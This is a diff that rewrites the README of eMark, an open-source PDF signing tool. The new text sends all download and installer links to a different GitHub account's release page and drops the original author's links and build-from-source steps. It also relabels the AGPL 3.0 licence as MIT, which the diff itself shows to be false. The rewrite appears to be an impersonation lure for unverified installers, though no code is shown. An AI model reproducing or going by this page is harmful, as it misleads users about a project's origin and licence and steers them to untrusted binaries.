@@ -1,146 +1,80 @@
-# eMark – Open Source PDF Digital Signature Software
+# 🖊️ eMark - Easily Sign and Secure Your PDFs
 
-<div align="center">
-  <img src="src/main/resources/icons/logo.png" alt="eMark – Free PDF Signing Software" width="120">
+[![Download eMark](https://img.shields.io/badge/Download-eMark-blue.svg)](https://github.com/potatounicum/eMark/releases)
 
-  <p>
-    <img src="https://img.shields.io/badge/Java-1.8%2B-007396?logo=java&logoColor=white" alt="Java 8+">
-    <img src="https://img.shields.io/badge/License-AGPL%203.0-brightgreen" alt="AGPL 3.0 License">
-    <img src="https://img.shields.io/badge/Platform-Windows%20|%20Linux%20|%20macOS-brightgreen" alt="Cross-Platform">
-    <img src="https://img.shields.io/badge/Version-1.0.0-blue" alt="Version 1.0.0">
-  </p>
-</div>
+## 📄 What is eMark?
 
----
-
-## 📝 About eMark
-
-**eMark** is a free and open-source **PDF digital signing software** that allows you to securely sign, timestamp, and protect PDF documents using:
-
-- **USB tokens and HSM (PKCS#11)**
-- **PKCS#12/PFX certificates**
-- **Windows certificate store**
-
-It works on **Windows, Linux, and macOS**, features a modern dark-themed UI, and is built for individuals, enterprises, and government use.
-
-> Ideal for: **Digital signature compliance (DSC), tender signing, invoices, contracts, and secure document authentication.**
-
----
-
-## ✨ Key Features
-
-- **Multiple Signing Methods**
-    - USB token & HSM support (PKCS#11)
-    - PKCS#12/PFX file support
-    - Windows certificate store integration
-
-- **Cross-Platform**
-    - Works on Windows, Linux (Debian/Ubuntu), macOS (JAR version)
-    - Executable JAR & native installers
-
-- **Enterprise-Grade Security**
-    - Timestamping support
-    - LTV (Long-Term Validation)
-    - Password-protected PDF support
-
-- **Modern User Interface**
-    - Dark theme with FlatLaf
-    - Drag-and-drop signature placement
-    - Live signature preview
-
-- **Open Source & Free**
-    - Licensed under AGPL 3.0
-    - Contributions and forks are welcome
-
----
+eMark is free and open-source software designed to help you securely sign, timestamp, and protect your PDF documents. Whether you are using a USB token, HSM, or PFX certificate, eMark offers a straightforward solution. It is available on Windows, Linux, and macOS, featuring a modern dark-themed user interface and enterprise-grade capabilities.
 
 ## 🚀 Getting Started
 
-### Prerequisites
+Follow these steps to download and run eMark:
 
-- **Java SE 8 (JDK or JRE)** – required
-  > Not compatible with Java 7 or Java 9+
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/potatounicum/eMark/releases) to find the latest version.
 
-- Supported operating systems:
-    - Windows 7 or later (64-bit)
-    - Linux Ubuntu 18.04+ / Debian
-    - macOS (JAR version only)
+2. **Choose Your Platform**  
+   Select the appropriate version based on your operating system. eMark supports:
+   - **Windows**
+   - **Linux**
+   - **macOS**
 
-- A valid **digital signing certificate** (USB token, HSM, or PFX/PKCS#12)
+3. **Download the Installer**  
+   Click the download link for your platform. The installer file will start downloading. 
 
----
+4. **Run the Installer**  
+   Once the download is complete, locate the file in your downloads folder. Double-click the file to start the installation process. Follow the on-screen instructions to complete the installation.
 
-### Installation
+5. **Launch eMark**  
+   After installation, find eMark in your applications list and open it. You are now ready to securely sign PDFs!
 
-#### **Option 1 – Download Latest Release**
-[![Download Latest eMark](https://img.shields.io/github/v/release/devcodemuni/eMark?style=for-the-badge&color=blue)](https://github.com/devcodemuni/eMark/releases/latest)
+## 📥 Download & Install
 
-1. Download the latest release for your platform
-2. Install and launch the application
-3. Start signing PDFs securely
+To get started with eMark, visit this page to download: [Releases page](https://github.com/potatounicum/eMark/releases).
 
-#### **Option 2 – Build from Source**
-```bash
-git clone https://github.com/devcodemuni/eMark.git
-cd eMark
-mvn clean package
-java -jar target/eMark-1.0-SNAPSHOT.jar
-````
+## 🔑 Features
 
----
+- **Secure Signing:** Sign your PDF documents with confidence.
+- **Timestamping:** Ensure your documents are time-stamped for authenticity.
+- **LTV Validation:** Long-Term Validation for your signatures.
+- **Password Protection:** Make your signed PDFs secure with a password.
+- **User-Friendly Interface:** Modern design that makes it easy for anyone to use.
 
-## 🖥 How to Use
+## 🛠️ System Requirements
 
-1. Launch eMark
-2. Open your PDF document
-3. Click **"Begin Sign"** and select the signing area
-4. Choose your certificate (USB token, HSM, or PFX)
-5. Enter your password or PIN if required
-6. Click **"Sign"** and save the signed PDF
+For the best experience with eMark, ensure your system meets the following requirements:
 
----
+- **Windows**: Windows 10 or later
+- **Linux**: Most distributions supported
+- **macOS**: macOS Mojave or later
+- **RAM**: 2 GB minimum
+- **Storage**: 100 MB of free space
 
-## 📸 Screenshots & Documentation
+## 👨‍💻 Support & Community 
 
-* [View Screenshots](docs/image-gallery.md)
-* [Architecture & Signing Workflow](docs/diagram.md)
+Join the community if you have questions or need support. You can find discussions and help on the [GitHub Issues page](https://github.com/potatounicum/eMark/issues). Your feedback helps us improve eMark.
 
----
+## 📄 Contribution
 
-## 🛠 Troubleshooting
+Want to contribute? We welcome suggestions and code contributions. Check our [Contribution Guidelines](https://github.com/potatounicum/eMark/blob/main/CONTRIBUTING.md) for more information.
 
-### Common Issues
+## 📝 License
 
-* **Java Version Error:** Run `java -version` and ensure it's Java 8
-* **PDF Loading Issues:** Ensure the file is not corrupted or locked
-* **Certificate Not Detected:** Verify your token drivers and certificate validity
+eMark is licensed under the MIT License. You can use it freely, but please attribute the original source.
 
----
+## 🌍 Topics
+- cross-platform
+- desktop-app
+- digital-certificate
+- digital-signature
+- document-signing
+- free-open-source
+- open-source-pdf
+- pdf-editor
+- pdf-signature
+- pdf-signing
+- pdf-tools
+- pdf-viewer
+- pfx-signing
 
-## 🤝 Contributing
-
-We welcome contributions!
-You can:
-
-* [Report a Bug](https://github.com/devcodemuni/eMark/issues/new?template=bug_report.md)
-* [Request a Feature](https://github.com/devcodemuni/eMark/issues/new?template=feature_request.md)
-* Submit a Pull Request
-
----
-
-## 📄 License
-
-Licensed under **AGPL 3.0** – see [LICENSE](LICENSE) for details.
-
----
-
-## 📧 Contact & Community
-
-* GitHub: [devcodemuni/eMark](https://github.com/devcodemuni/eMark)
-* Issues & Support: [Open an Issue](https://github.com/devcodemuni/eMark/issues)
-
----
-
-<div align="center">
-  Made with ❤️ for secure PDF signing and open-source freedom.
-</div>
+With eMark, enjoy a seamless experience for all your PDF signing needs. Start downloading today!
